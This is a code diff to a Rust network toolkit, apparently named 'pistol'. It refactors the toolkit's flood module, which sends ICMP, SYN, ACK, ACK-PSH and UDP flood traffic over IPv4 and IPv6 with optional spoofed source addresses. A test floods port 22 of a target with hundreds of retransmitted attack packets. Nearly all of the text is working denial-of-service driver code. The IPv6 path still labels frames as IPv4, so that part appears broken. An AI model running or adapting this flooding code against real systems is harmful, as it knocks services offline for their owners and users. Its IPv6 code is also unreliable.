@@ -3,9 +3,11 @@ use chrono::DateTime;
 #[cfg(feature = "flood")]
 use chrono::Local;
 #[cfg(feature = "flood")]
+use crossbeam::channel::Sender;
+#[cfg(feature = "flood")]
 use pnet::datalink::MacAddr;
 #[cfg(feature = "flood")]
-use pnet::datalink::NetworkInterface;
+use pnet::packet::ethernet::EtherTypes;
 #[cfg(feature = "flood")]
 use prettytable::Cell;
 #[cfg(feature = "flood")]
@@ -50,6 +52,8 @@ pub mod udp6;
 
 #[cfg(feature = "flood")]
 use crate::NetInfo;
+#[cfg(feature = "flood")]
+use crate::SendMsg;
 #[cfg(feature = "flood")]
 use crate::error::PistolError;
 #[cfg(feature = "flood")]
@@ -187,55 +191,33 @@ fn ipv4_flood_thread(
     src_mac: MacAddr,
     src_ipv4: Ipv4Addr,
     src_port: u16,
-    interface: &NetworkInterface,
     method: FloodMethods,
-    threads: usize,
     retransmit: usize,
-) -> Result<(usize, usize), PistolError> {
-    let (tx, rx) = channel();
-    for _ in 0..threads {
-        let tx = tx.clone();
-        let interface = interface.clone();
-        thread::spawn(move || {
-            let ret = match method {
-                FloodMethods::Icmp => icmp::build_icmp_flood_packet(
-                    dst_mac, dst_ipv4, src_mac, src_ipv4, &interface, retransmit,
-                ),
-                FloodMethods::Syn => tcp::build_syn_flood_packet(
-                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::Ack => tcp::build_ack_flood_packet(
-                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::AckPsh => tcp::build_ack_psh_flood_packet(
-                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::Udp => udp::build_udp_flood_packet(
-                    dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                    retransmit,
-                ),
-            };
-            let send_buff_size = match ret {
-                Ok(s) => s + 14, // Ethernet frame header length.
-                Err(e) => {
-                    error!("{}", e);
-                    0
-                }
-            };
-            if let Err(e) = tx.send(send_buff_size) {
-                error!("failed to send to tx on func ipv4_flood_thread: {}", e);
-            }
-        });
+    to_send: Sender<SendMsg>,
+) -> Result<usize, PistolError> {
+    let buff = match method {
+        FloodMethods::Icmp => icmp::build_icmp_flood_packet(dst_ipv4, src_ipv4)?,
+        FloodMethods::Syn => tcp::build_syn_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
+        FloodMethods::Ack => tcp::build_ack_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
+        FloodMethods::AckPsh => {
+            tcp::build_ack_psh_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
+        }
+        FloodMethods::Udp => udp::build_udp_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?,
+    };
+
+    let send_msg = SendMsg {
+        dst_mac,
+        src_mac,
+        ether_payload: buff.clone(),
+        ether_type: EtherTypes::Ipv4,
+        retransmit,
+    };
+    if let Err(e) = to_send.send(send_msg) {
+        error!("failed to send to to_send on func ipv4_flood_thread: {}", e);
     }
-    let iter = rx.into_iter().take(threads);
-    let mut total_send_buff_size = 0;
-    for send_buff_size in iter {
-        total_send_buff_size += send_buff_size;
-    }
-    Ok((threads * retransmit, total_send_buff_size))
+
+    let send_buff_size = buff.len() * retransmit;
+    Ok(send_buff_size)
 }
 
 #[cfg(feature = "flood")]
@@ -246,65 +228,43 @@ fn ipv6_flood_thread(
     src_mac: MacAddr,
     src_ipv6: Ipv6Addr,
     src_port: u16,
-    interface: &NetworkInterface,
     method: FloodMethods,
-    threads: usize,
     retransmit: usize,
-) -> Result<(usize, usize), PistolError> {
-    let (tx, rx) = channel();
-    for _ in 0..threads {
-        let tx = tx.clone();
-        let interface = interface.clone();
-        thread::spawn(move || {
-            let ret = match method {
-                FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(
-                    dst_mac, dst_ipv6, src_mac, src_ipv6, &interface, retransmit,
-                ),
-                FloodMethods::Syn => tcp6::build_syn_flood_packet(
-                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::Ack => tcp6::build_ack_flood_packet(
-                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::AckPsh => tcp6::build_ack_psh_flood_packet(
-                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                    retransmit,
-                ),
-                FloodMethods::Udp => udp6::send_udp_flood_packet(
-                    dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                    retransmit,
-                ),
-            };
-            let send_buff_size = match ret {
-                Ok(s) => s + 14, // Ethernet frame header length.
-                Err(e) => {
-                    error!("{}", e);
-                    0
-                }
-            };
-            if let Err(e) = tx.send(send_buff_size) {
-                error!("failed to send to tx on func ipv6_flood_thread: {}", e);
-            }
-        });
+    to_send: Sender<SendMsg>,
+) -> Result<usize, PistolError> {
+    let buff = match method {
+        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(dst_ipv6, src_ipv6)?,
+        FloodMethods::Syn => tcp6::build_syn_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
+        FloodMethods::Ack => tcp6::build_ack_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
+        FloodMethods::AckPsh => {
+            tcp6::build_ack_psh_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
+        }
+        FloodMethods::Udp => udp6::send_udp_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?,
+    };
+
+    let send_msg = SendMsg {
+        dst_mac,
+        src_mac,
+        ether_payload: buff.clone(),
+        ether_type: EtherTypes::Ipv4,
+        retransmit,
+    };
+    if let Err(e) = to_send.send(send_msg) {
+        error!("failed to send to to_send on func ipv4_flood_thread: {}", e);
     }
-    let iter = rx.into_iter().take(threads);
-    let mut total_send_buff_size = 0;
-    for send_buff_size in iter {
-        total_send_buff_size += send_buff_size;
-    }
-    Ok((threads * retransmit, total_send_buff_size))
+
+    let send_buff_size = buff.len() * retransmit;
+    Ok(send_buff_size)
 }
 
 #[cfg(feature = "flood")]
 fn flood(
     net_infos: Vec<NetInfo>,
     method: FloodMethods,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     let mut pistol_floods = Floods::new();
     let (tx, rx) = channel();
@@ -331,15 +291,15 @@ fn flood(
                                 None => utils::random_port(),
                             },
                         };
-                        let interface = ni.interface.clone();
                         let dst_addr = ni.inferred_dst_addr;
 
                         let tx = tx.clone();
+                        let to_send = to_send.clone();
                         thread::spawn(move || {
                             let start_time = Instant::now();
                             let ret = ipv4_flood_thread(
-                                dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port,
-                                &interface, method, threads, retransmit,
+                                dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, method,
+                                retransmit, to_send,
                             );
                             if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                                 error!("failed to send to tx on func flood: {}", e);
@@ -368,15 +328,15 @@ fn flood(
                                 None => utils::random_port(),
                             },
                         };
-                        let interface = ni.interface.clone();
                         let dst_addr = ni.inferred_dst_addr;
 
                         let tx = tx.clone();
+                        let to_send = to_send.clone();
                         thread::spawn(move || {
                             let start_time = Instant::now();
                             let ret = ipv6_flood_thread(
-                                dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port,
-                                &interface, method, threads, retransmit,
+                                dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, method,
+                                retransmit, to_send,
                             );
                             if let Err(e) = tx.send((dst_addr, ret, start_time)) {
                                 error!("failed to send to tx on func flood: {}", e);
@@ -394,10 +354,10 @@ fn flood(
     for (dst_addr, ret, start_time) in iter {
         let time_cost = start_time.elapsed();
         match ret {
-            Ok((send_packet, send_size)) => {
+            Ok(send_size) => {
                 let flood_report = FloodReport {
                     addr: dst_addr,
-                    send_packet,
+                    send_packet: retransmit * repeat,
                     send_size,
                     cost: time_cost,
                 };
@@ -411,12 +371,13 @@ fn flood(
 }
 
 #[cfg(feature = "flood")]
-pub fn flood_raw(
+pub(crate) fn flood_raw(
     net_info: NetInfo,
     method: FloodMethods,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
     let mut flood = Flood::new();
     let start = Instant::now();
@@ -425,7 +386,6 @@ pub fn flood_raw(
     let src_mac = net_info.inferred_src_mac;
     let src_addr = net_info.inferred_src_addr;
     let src_port = net_info.src_port;
-    let interface = &net_info.interface;
     match dst_addr {
         IpAddr::V4(dst_ipv4) => {
             let mut total_send_buff_size = 0;
@@ -446,34 +406,33 @@ pub fn flood_raw(
                 };
 
                 for &dst_port in &net_info.dst_ports {
-                    let ret = match method {
-                        FloodMethods::Icmp => icmp::build_icmp_flood_packet(
-                            dst_mac, dst_ipv4, src_mac, src_ipv4, &interface, retransmit,
-                        ),
-                        FloodMethods::Syn => tcp::build_syn_flood_packet(
-                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                            retransmit,
-                        ),
-                        FloodMethods::Ack => tcp::build_ack_flood_packet(
-                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                            retransmit,
-                        ),
-                        FloodMethods::AckPsh => tcp::build_ack_psh_flood_packet(
-                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                            retransmit,
-                        ),
-                        FloodMethods::Udp => udp::build_udp_flood_packet(
-                            dst_mac, dst_ipv4, dst_port, src_mac, src_ipv4, src_port, &interface,
-                            retransmit,
-                        ),
-                    };
-                    let send_buff_size = match ret {
-                        Ok(s) => s + 14, // Ethernet frame header length.
-                        Err(e) => {
-                            error!("{}", e);
-                            0
+                    let buff = match method {
+                        FloodMethods::Icmp => icmp::build_icmp_flood_packet(dst_ipv4, src_ipv4)?,
+                        FloodMethods::Syn => {
+                            tcp::build_syn_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
+                        }
+                        FloodMethods::Ack => {
+                            tcp::build_ack_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
+                        }
+                        FloodMethods::AckPsh => {
+                            tcp::build_ack_psh_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
+                        }
+                        FloodMethods::Udp => {
+                            udp::build_udp_flood_packet(dst_ipv4, dst_port, src_ipv4, src_port)?
                         }
                     };
+                    let send_msg = SendMsg {
+                        dst_mac,
+                        src_mac,
+                        ether_payload: buff.clone(),
+                        ether_type: EtherTypes::Ipv4,
+                        retransmit,
+                    };
+                    if let Err(e) = to_send.send(send_msg) {
+                        error!("failed to send to to_send on func ipv4_flood_thread: {}", e);
+                    }
+
+                    let send_buff_size = buff.len() * retransmit;
                     total_send_buff_size += send_buff_size;
                 }
             }
@@ -505,34 +464,33 @@ pub fn flood_raw(
                 };
 
                 for &dst_port in &net_info.dst_ports {
-                    let ret = match method {
-                        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(
-                            dst_mac, dst_ipv6, src_mac, src_ipv6, &interface, retransmit,
-                        ),
-                        FloodMethods::Syn => tcp6::build_syn_flood_packet(
-                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                            retransmit,
-                        ),
-                        FloodMethods::Ack => tcp6::build_ack_flood_packet(
-                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                            retransmit,
-                        ),
+                    let buff = match method {
+                        FloodMethods::Icmp => icmpv6::send_icmpv6_flood_packet(dst_ipv6, src_ipv6)?,
+                        FloodMethods::Syn => {
+                            tcp6::build_syn_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
+                        }
+                        FloodMethods::Ack => {
+                            tcp6::build_ack_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
+                        }
                         FloodMethods::AckPsh => tcp6::build_ack_psh_flood_packet(
-                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                            retransmit,
-                        ),
-                        FloodMethods::Udp => udp6::send_udp_flood_packet(
-                            dst_mac, dst_ipv6, dst_port, src_mac, src_ipv6, src_port, &interface,
-                            retransmit,
-                        ),
-                    };
-                    let send_buff_size = match ret {
-                        Ok(s) => s + 14, // Ethernet frame header length.
-                        Err(e) => {
-                            error!("{}", e);
-                            0
+                            dst_ipv6, dst_port, src_ipv6, src_port,
+                        )?,
+                        FloodMethods::Udp => {
+                            udp6::send_udp_flood_packet(dst_ipv6, dst_port, src_ipv6, src_port)?
                         }
                     };
+
+                    let send_msg = SendMsg {
+                        dst_mac,
+                        src_mac,
+                        ether_payload: buff.clone(),
+                        ether_type: EtherTypes::Ipv4,
+                        retransmit,
+                    };
+                    if let Err(e) = to_send.send(send_msg) {
+                        error!("failed to send to to_send on func ipv4_flood_thread: {}", e);
+                    }
+                    let send_buff_size = buff.len() * retransmit;
                     total_send_buff_size += send_buff_size;
                 }
             }
@@ -549,143 +507,183 @@ pub fn flood_raw(
 }
 
 #[cfg(feature = "flood")]
-pub fn icmp_flood(
+pub(crate) fn icmp_flood(
     net_infos: Vec<NetInfo>,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     flood(
         net_infos,
         FloodMethods::Icmp,
-        threads,
         retransmit,
         repeat,
         fake_src,
+        to_send,
     )
 }
 
 #[cfg(feature = "flood")]
-pub fn icmp_flood_raw(
+pub(crate) fn icmp_flood_raw(
     net_info: NetInfo,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
-    flood_raw(net_info, FloodMethods::Icmp, retransmit, repeat, fake_src)
+    flood_raw(
+        net_info,
+        FloodMethods::Icmp,
+        retransmit,
+        repeat,
+        fake_src,
+        to_send,
+    )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_syn_flood(
+pub(crate) fn tcp_syn_flood(
     net_infos: Vec<NetInfo>,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     flood(
         net_infos,
         FloodMethods::Syn,
-        threads,
         retransmit,
         repeat,
         fake_src,
+        to_send,
     )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_syn_flood_raw(
+pub(crate) fn tcp_syn_flood_raw(
     net_info: NetInfo,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
-    flood_raw(net_info, FloodMethods::Syn, retransmit, repeat, fake_src)
+    flood_raw(
+        net_info,
+        FloodMethods::Syn,
+        retransmit,
+        repeat,
+        fake_src,
+        to_send,
+    )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_ack_flood(
+pub(crate) fn tcp_ack_flood(
     net_infos: Vec<NetInfo>,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     flood(
         net_infos,
         FloodMethods::Ack,
-        threads,
         retransmit,
         repeat,
         fake_src,
+        to_send,
     )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_ack_flood_raw(
+pub(crate) fn tcp_ack_flood_raw(
     net_info: NetInfo,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
-    flood_raw(net_info, FloodMethods::Ack, retransmit, repeat, fake_src)
+    flood_raw(
+        net_info,
+        FloodMethods::Ack,
+        retransmit,
+        repeat,
+        fake_src,
+        to_send,
+    )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_ack_psh_flood(
+pub(crate) fn tcp_ack_psh_flood(
     net_infos: Vec<NetInfo>,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     flood(
         net_infos,
         FloodMethods::AckPsh,
-        threads,
         retransmit,
         repeat,
         fake_src,
+        to_send,
     )
 }
 
 #[cfg(feature = "flood")]
-pub fn tcp_ack_psh_flood_raw(
+pub(crate) fn tcp_ack_psh_flood_raw(
     net_info: NetInfo,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
-    flood_raw(net_info, FloodMethods::AckPsh, retransmit, repeat, fake_src)
+    flood_raw(
+        net_info,
+        FloodMethods::AckPsh,
+        retransmit,
+        repeat,
+        fake_src,
+        to_send,
+    )
 }
 
 #[cfg(feature = "flood")]
-pub fn udp_flood(
+pub(crate) fn udp_flood(
     net_infos: Vec<NetInfo>,
-    threads: usize,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Floods, PistolError> {
     flood(
         net_infos,
         FloodMethods::Udp,
-        threads,
         retransmit,
         repeat,
         fake_src,
+        to_send,
     )
 }
 
 #[cfg(feature = "flood")]
-pub fn udp_flood_raw(
+pub(crate) fn udp_flood_raw(
     net_info: NetInfo,
     retransmit: usize,
     repeat: usize,
     fake_src: bool,
+    to_send: Sender<SendMsg>,
 ) -> Result<Flood, PistolError> {
-    flood_raw(net_info, FloodMethods::Udp, retransmit, repeat, fake_src)
+    flood_raw(
+        net_info,
+        FloodMethods::Udp,
+        retransmit,
+        repeat,
+        fake_src,
+        to_send,
+    )
 }
 
 #[cfg(feature = "flood")]
@@ -700,13 +698,13 @@ mod tests {
         let ports = Some(vec![22]);
         let target1 = Target::new(dst_addr.into(), ports);
         let targets = vec![target1];
-        let threads = 240; // It can be simply understood as the number of attack threads.
         let retransmit = 480; // The number of times to repeat sending the same attack packet.
         let repeat = 4; // The number of times each thread repeats the attack.
 
         let mut pistol = Pistol::new();
         let (net_infos, dur) = pistol.init_runner(&targets, None, None).unwrap();
-        let ret = tcp_syn_flood(net_infos, threads, retransmit, repeat, true).unwrap();
+        let to_send = pistol.to_senders["ens33"].clone();
+        let ret = tcp_syn_flood(net_infos, retransmit, repeat, true, to_send).unwrap();
         println!("layer2: {:.2}s, {}", dur.as_secs_f32(), ret);
     }
 }
